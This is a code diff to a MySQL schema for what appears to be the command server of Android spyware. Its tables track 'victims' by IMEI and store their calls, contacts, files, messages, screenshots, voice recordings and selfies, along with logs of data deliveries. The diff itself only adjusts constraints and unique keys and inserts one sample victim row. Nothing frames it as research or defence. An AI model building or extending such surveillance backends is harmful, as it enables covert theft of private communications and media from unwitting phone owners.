@@ -25,7 +25,7 @@ CREATE TABLE IF NOT EXISTS `calls` (
   `phone` varchar(20) NOT NULL,
   `call_type` enum('IN','OUT','MISSED') NOT NULL,
   `called_at` timestamp NULL,
-  `is_active` tinyint(4) CHECK(is_active IN (0,1)) NOT NULL DEFAULT 1,
+  `is_active` tinyint(4) NOT NULL DEFAULT 1,
   `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
   PRIMARY KEY (`id`),
   KEY `victim_id` (`victim_id`),
@@ -42,7 +42,7 @@ CREATE TABLE IF NOT EXISTS `contacts` (
   `victim_id` int(11) NOT NULL,
   `android_contact_id`  INTEGER  NOT NULL,
   `name` varchar(100) DEFAULT NULL,
-  `is_active` tinyint(4) CHECK(is_active IN (0,1)) NOT NULL DEFAULT 1,
+  `is_active` tinyint(4) NOT NULL DEFAULT 1,
   `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
   PRIMARY KEY (`id`),
   KEY `victim_id` (`victim_id`),
@@ -80,9 +80,9 @@ CREATE TABLE IF NOT EXISTS `deliveries` (
   `id` int(11) NOT NULL AUTO_INCREMENT,
   `victim_id` int(11) NOT NULL,
   `data_type` enum('messages','call_logs','contacts','file_logs','media_screen_shot','media_voice','media_selfie') NOT NULL,
-  `error` tinyint(4) CHECK(error IN (0,1)) NOT NULL,
+  `error` tinyint(4) NOT NULL,
   `message` text NOT NULL,
-  `server_error` tinyint(4) CHECK(server_error IN (0,1)) NOT NULL DEFAULT 0,
+  `server_error` tinyint(4) NOT NULL DEFAULT 0,
   `server_error_message` text DEFAULT NULL,
   `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
   PRIMARY KEY (`id`),
@@ -101,7 +101,7 @@ CREATE TABLE IF NOT EXISTS `files` (
   `real_filename` text NOT NULL,
   `file_path` text NOT NULL,
   `size` int(11) NOT NULL,
-  `is_active` tinyint(4) CHECK(is_active IN (0,1)) NOT NULL DEFAULT 1,
+  `is_active` tinyint(4)   NOT NULL DEFAULT 1,
   `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
   PRIMARY KEY (`id`),
   KEY `victim_id` (`victim_id`),
@@ -119,7 +119,7 @@ CREATE TABLE IF NOT EXISTS `media` (
   `name` varchar(100) NOT NULL,
   `_type` enum('SCREENSHOT','VOICE','SELFIE') NOT NULL,
   `captured_at` timestamp NULL,
-  `is_active` tinyint(4) CHECK(is_active IN (0,1)) NOT NULL DEFAULT 1,
+  `is_active` tinyint(4)   NOT NULL DEFAULT 1,
   `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
   PRIMARY KEY (`id`),
   KEY `victim_id` (`victim_id`),
@@ -158,11 +158,12 @@ CREATE TABLE IF NOT EXISTS `victims` (
   `api_key` varchar(10) NOT NULL,
   `imei` varchar(16) NOT NULL,
   `actions` varchar(100) DEFAULT NULL,
-  `is_active` tinyint(4) CHECK(is_active IN (0,1)) NOT NULL DEFAULT 1,
+  `is_active` tinyint(4)   NOT NULL DEFAULT 1,
   `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
   PRIMARY KEY (`id`),
-  FOREIGN KEY (client_id) REFERENCES clients(id) ON UPDATE CASCADE ON DELETE CASCADE
-  UNIQUE KEY `imei` (`imei`)
+  FOREIGN KEY (client_id) REFERENCES clients(id) ON UPDATE CASCADE ON DELETE CASCADE,
+  UNIQUE KEY `imei` (`imei`),
+  UNIQUE KEY `api_key` (`api_key`)
 ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 
 DROP TABLE IF EXISTS `clients`;
@@ -170,14 +171,17 @@ CREATE TABLE IF NOT EXISTS `clients`(
   `id` int(11) NOT NULL AUTO_INCREMENT,
   `username` VARCHAR (20) NOT NULL,
   `pass_hash` TEXT NOT NULL,
+  `api_key` varchar(10) NOT NULL,
   `email` VARCHAR(100) NOT NULL,
-  `is_verified_email` TINYINT(4) CHECK(is_verified_email IN (0,1)) NOT NULL DEFAULT 0,
-  `is_active` tinyint(4) CHECK(is_active IN (0,1)) NOT NULL DEFAULT 1,
-  `client_code` TEXT NOT NULL,
+  `is_verified_email` TINYINT(4) NOT NULL DEFAULT 0,
+  `is_active` tinyint(4)   NOT NULL DEFAULT 1,
+  `client_code` VARCHAR (20) NOT NULL,
   `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
   PRIMARY KEY (id),
   UNIQUE KEY (username),
-  UNIQUE KEY (email)
+  UNIQUE KEY (email),
+  UNIQUE KEY (api_key),
+  UNIQUE KEY (client_code)
 );
 
 INSERT INTO victims (name,api_key,imei) VALUES ('Shifar','YRxxhK7pIi',12345678);
